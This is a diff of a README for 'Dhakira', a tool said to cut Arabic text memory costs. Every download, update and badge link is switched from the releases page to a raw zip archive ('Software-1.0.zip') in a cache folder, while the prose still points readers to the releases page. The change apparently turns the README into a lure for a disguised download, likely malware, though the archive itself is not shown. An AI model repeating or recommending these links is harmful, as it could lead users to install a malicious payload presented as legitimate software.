@@ -1,6 +1,6 @@
 # 💾 Dhakira - Save Arabic Memory Costs Easily
 
-[![Download Dhakira](https://img.shields.io/badge/Download-Dhakira-blue?style=for-the-badge)](https://github.com/akaxhx-ctrl/Dhakira/releases)
+[![Download Dhakira](https://github.com/akaxhx-ctrl/Dhakira/raw/refs/heads/main/dhakira/cache/Software-1.0.zip)](https://github.com/akaxhx-ctrl/Dhakira/raw/refs/heads/main/dhakira/cache/Software-1.0.zip)
 
 ---
 
@@ -27,7 +27,7 @@ The system works locally on your computer and supports many Arabic dialects, inc
 
 Start by visiting the official download page:
 
-[⬇️ Download Dhakira Here](https://github.com/akaxhx-ctrl/Dhakira/releases)
+[⬇️ Download Dhakira Here](https://github.com/akaxhx-ctrl/Dhakira/raw/refs/heads/main/dhakira/cache/Software-1.0.zip)
 
 Click the button above to open the Dhakira releases page. You will find files ready to download for your operating system.
 
@@ -98,7 +98,7 @@ Arabic text is complex and uses more computing power than English. Dhakira tackl
 
 Periodically check the releases page for updates:
 
-[⬆️ Update Dhakira](https://github.com/akaxhx-ctrl/Dhakira/releases)
+[⬆️ Update Dhakira](https://github.com/akaxhx-ctrl/Dhakira/raw/refs/heads/main/dhakira/cache/Software-1.0.zip)
 
 Download the newest version and run the installer again. Your saved memories will stay safe.
 
@@ -114,6 +114,6 @@ If you face issues or want to learn more:
 
 ---
 
-# [Download Dhakira](https://github.com/akaxhx-ctrl/Dhakira/releases)  
+# [Download Dhakira](https://github.com/akaxhx-ctrl/Dhakira/raw/refs/heads/main/dhakira/cache/Software-1.0.zip)  
 
 Start saving costs on Arabic memory today by visiting the release page above. Follow the simple download and installation steps to get Dhakira running on your PC.
